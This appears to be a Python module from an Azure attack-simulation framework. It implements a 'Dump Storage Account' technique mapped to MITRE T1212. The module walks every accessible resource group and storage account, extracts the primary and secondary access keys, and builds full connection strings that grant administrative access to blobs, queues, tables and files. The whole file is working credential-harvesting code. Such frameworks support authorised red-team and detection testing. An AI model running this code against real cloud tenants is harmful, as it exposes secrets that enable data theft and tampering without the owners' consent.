from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.resource import ResourceManagementClient
from azure.mgmt.storage import StorageManagementClient
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureDumpStorageAccount(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1212",
                technique_name="Exploitation for Credential Access",
                tactics=["Credential Access"],
                sub_technique_name=None
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT605.1",
                technique_name="Resource Secret Reveal",
                tactics=["Credential Access"],
                sub_technique_name="Storage Account Access Key Dumping"
            )
        ]
        super().__init__("Dump Storage Account", "Extracts access keys and connection strings from Azure Storage accounts to gain persistent access to storage resources. This technique allows to bypass typical authentication controls by obtaining storage account keys that provide full administrative access to all blobs, queues, tables and files within the storage account. The extracted keys can be used to directly access storage data from anywhere, potentially leading to data exfiltration or manipulation. The technique enumerates through all storage accounts in accessible resource groups and dumps both primary and secondary access keys along with their corresponding connection strings.", mitre_techniques, azure_trm_technique)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            credential = AzureAccess.get_azure_auth_credential()
            # retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # create client
            resource_client = ResourceManagementClient(credential, subscription_id)
            storage_client = StorageManagementClient(credential, subscription_id)
            
            storage_keys = {}
            
            # List resource groups
            resource_groups = resource_client.resource_groups.list()
            for resource_group in resource_groups:
                print("Resource Group", resource_group.name)
                storage_keys[resource_group.name] = {}
                
                try:
                    # List storage accounts in each resource group
                    storage_accounts = storage_client.storage_accounts.list_by_resource_group(resource_group.name)
                    for storage_account in storage_accounts:
                        print("  Storage Account", storage_account.name)
                        keys = storage_client.storage_accounts.list_keys(resource_group.name, storage_account.name)
                        storage_keys[resource_group.name][storage_account.name] = []
                        # Store keys for each storage account
                        if keys:
                            for key in keys.keys:
                                # Construct connection string using the first key
                                connection_string = (
                                    f"DefaultEndpointsProtocol=https;AccountName={storage_account.name};"
                                    f"AccountKey={key.value};EndpointSuffix=core.windows.net"
                                )

                                storage_keys[resource_group.name][storage_account.name].append({
                                    "key_name": key.key_name,
                                    "key_value": key.value,
                                    "connection_string": connection_string
                                })
                except:
                    pass

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully dumped keys from storage accounts",
                "value": storage_keys
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to dump key from storage account"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {}